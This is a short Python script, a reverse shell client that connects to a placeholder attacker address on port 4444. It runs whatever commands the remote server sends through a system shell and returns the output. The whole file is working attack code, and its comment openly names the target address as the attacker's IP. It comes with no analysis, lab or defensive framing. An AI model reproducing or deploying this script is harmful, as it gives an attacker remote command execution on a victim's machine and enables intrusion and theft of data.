import socket
import subprocess

SERVER_IP = "YOUR_IP_HERE"  # Change this to the attacker's IP
PORT = 4444  # Same port as the server

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, PORT))

    while True:
        command = client.recv(4096).decode()
        if command.lower() == "exit":
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            output = str(e).encode()

        client.sendall(output)

    client.close()

if __name__ == "__main__":
    connect_to_server()
